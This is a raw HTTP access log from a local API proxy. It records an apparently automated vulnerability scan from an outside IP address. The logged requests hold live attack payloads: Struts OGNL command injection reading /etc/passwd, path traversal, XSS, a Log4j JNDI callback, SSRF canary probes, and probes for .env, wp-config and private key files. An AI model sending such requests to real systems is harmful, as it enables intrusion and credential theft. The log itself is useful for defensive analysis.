2026-02-20 15:59:25,364 [INFO] 目标地址  : https://dashscope.aliyuncs.com/compatible-mode/v1
INFO:     127.0.0.1:49026 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:49034 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:43114 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:59842 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:58974 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:58472 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:45572 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:48710 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:35646 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:33026 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:53080 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:51450 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:54888 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:57774 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:37924 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:33010 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:59126 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:36118 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:35162 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:35172 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:43454 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:47600 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     3.211.106.148:0 - "GET /api/jsonws HTTP/1.1" 200 OK
INFO:     127.0.0.1:36570 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:36574 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:34186 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:49856 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:45056 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:45064 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:34614 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:34628 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:48958 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:48956 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:48960 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:48966 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:41606 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:41592 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:41610 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:41620 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     127.0.0.1:49146 - "POST /v1/messages?beta=true HTTP/1.1" 200 OK
INFO:     3.211.106.148:59350 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:59360 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:59384 - "GET /auth HTTP/1.1" 200 OK
INFO:     3.211.106.148:59372 - "GET /api/jsonws HTTP/1.1" 200 OK
INFO:     3.211.106.148:59366 - "GET /login HTTP/1.1" 200 OK
INFO:     3.211.106.148:59368 - "GET /index.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:59384 - "POST /translate HTTP/1.1" 200 OK
INFO:     3.211.106.148:59360 - "GET /o/portal-settings-authentication-opensso-web/com.liferay.portal.settings.web/test_opensso.jsp?openSsoLoginURL=https://39vvxbi3tog12uihphkz1c4nvul.wf-39vvxrq9bhkynmfgxtkkcldvaex.canary.assetnotessrf.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:59372 - "POST /login HTTP/1.1" 200 OK
INFO:     3.211.106.148:58906 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /api/heapdump HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /_vti_cnf/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /wp-config.php.bakup HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /log/warn.log HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /webjars/swagger-ui/4.14.3/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38766 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /.bash_history HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /jshERP-boot/user/getAllList%3B.ico HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /bugs?o=@ssrfcanary.com%23&p=def HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /webjars/swagger-ui/3.32.5/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /webjars/swagger-ui/3.20.2/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /portalapi/v1/roles/option%3B/v1/ping HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /webjars/swagger-ui/3.30.0/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /.zsh_history HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /application.wadl HTTP/1.1" 200 OK
INFO:     3.211.106.148:38778 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "POST /ws/geral/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /%28S%28x%29%29/b/%28S%28x%29%29in/Dapper.dll HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /usr/share/dpkg/sh/dpkg-error.sh%3F/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /concrete/libraries/3rdparty/Zend/Http/Client/_files/testRedirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)> HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /invoke/sample.xslt/transformToString HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /robomongo.json HTTP/1.1" 200 OK
INFO:     3.211.106.148:38782 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "POST /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /wp-content/plugins/essential-addons-for-elementor-lite/readme.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /servlet/~yer/bsh.servlet.BshServlet HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "POST /SAAS/auth/login/userstore HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "POST /wp-content/themes/howto_wp/metabox/tests/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /adserver/www/delivery/lg.php?dest=http://example.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /passwordreset?bundle=';alert(document.domain);var+ok=' HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "POST /api/v1/totp/user-backup-code/../../system/platform?operation=testConnectivity HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /59.110.40.73-9a3e209ba07c8495ac1f7037218a90b2.jsp?pwd=j HTTP/1.1" 200 OK
INFO:     3.211.106.148:38786 - "GET / HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /secureader/javax.faces.resource./WEB-INF/web.xml.jsf?ln=.. HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /script/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /cgi-bin/config?LD_DEBUG=help HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /sidekiq/queues HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /api/swagger/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /zimbraAdmin/public/admin.jsp?dev=1&packages=../Offline HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "POST /sysShell HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /wiki/login.action HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /wp-config.php.swp HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "POST / HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /ws-api/v2/users/me/details?token=02 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /rdPage.aspx HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /static/js/../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /index.php?option=com_perchagallery&controller=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "POST /wp-content/wp-plugins/user-export-with-their-meta-data/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /api/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /eam/vib?id=C:\\ProgramData\\VMware\\VMware%20VirtualCenter\\vcdb.properties HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /v1/api-docs HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /api/.env HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /wp-config.php_bak HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /admin/config/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "POST /modules/ps_checkout/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /includes/config.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /webjars/swagger-ui/3.20.8/index.html HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /jmx-console/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /Telerik.Web.UI.DialogHandler.aspx HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /wp-config.php6 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /static///////../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /en/?/../../../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /opensearch HTTP/1.1" 200 OK
INFO:     3.211.106.148:38732 - "GET /pls/apex HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /openx2/www/delivery/al.php?zoneid=1&layerstyle=geocities&closetext=<script>alert(123);</script> HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /?send=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-send%27%29%3E&attachment_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-attachment_id%27%29%3E&wp_screen_options=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-wp_screen_options%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-page_id%27%29%3E&locale=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-locale%27%29%3E&function=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-function%27%29%3E&profile=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-profile%27%29%3E&day=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-day%27%29%3E&folder=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-folder%27%29%3E&mobile=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-mobile%27%29%3E&settings=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-settings%27%29%3E&comments=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-comments%27%29%3E&all=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-all%27%29%3E&menu=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss-menu%27%29%3E HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "POST /vizportal/api/web/v1/getsessioninfo HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /Citrix/PNAgent/config.xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /invoke/sample.xslt/transformToString HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /admin/env HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /tests/generate.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /webstats/awstats.pl HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "POST /login HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /controller/config HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /struts2-showcase/showcase.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /sentry?o=@ssrfcanary.com%23&p=def HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /wp-admin/admin-ajax.php?action=cdaily&subaction=cd_dismisshint&callback=<script>alert(document.cookie)</script> HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /plugin/credentials/.xml HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "POST /rest/hipchat/integration/latest/installation/begin HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "POST /API/convertCSVtoParquet.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /proxy%3Ahttp%3A//example.com/index.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /privatekey.key HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /an.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /shared/.env HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /api/v1/core/proxy/jsonprequest?objresponse=false&websiteproxy=true&escapestring=false&url=https://ssrfcanary.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /zdm/wpe/tou?api-version=${j${lower:n}di:${lower:l}${lower:d}a${lower:p}://zenmobile.${hostName}.${date:MM-dd-yyyy}.59.110.40.73.log4j.assetnote-callback.com/} HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /?url=https://ssrfcanary.com&u=https://ssrfcanary.com&get=https://ssrfcanary.com&endpoint=https://ssrfcanary.com&uri=https://ssrfcanary.com HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /jobmanager/logs/..%252fREADME.txt HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /phppgadmin/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /OpenAM-11.0.0/ui/PWResetUserValidation HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /wp-content/plugins/simple-fields/simple_fields.php?wp_abspath=/etc/passwd%00 HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /web.config.bak HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /parameters.yml.dist HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "POST /cgi-bin/supportInstaller HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "POST /_session HTTP/1.1" 200 OK
INFO:     3.211.106.148:38730 - "GET /res/../admin/diagnostic.jsp HTTP/1.1" 200 OK
INFO:     3.211.106.148:38754 - "GET /wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd HTTP/1.1" 200 OK
INFO:     3.211.106.148:38800 - "GET /wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php HTTP/1.1" 200 OK
INFO:     3.211.106.148:38724 - "GET /php/ HTTP/1.1" 200 OK
INFO:     3.211.106.148:38722 - "GET /Telerik.Web.UI.WebResource.axd?type=r%00au HTTP/1.1" 200 OK
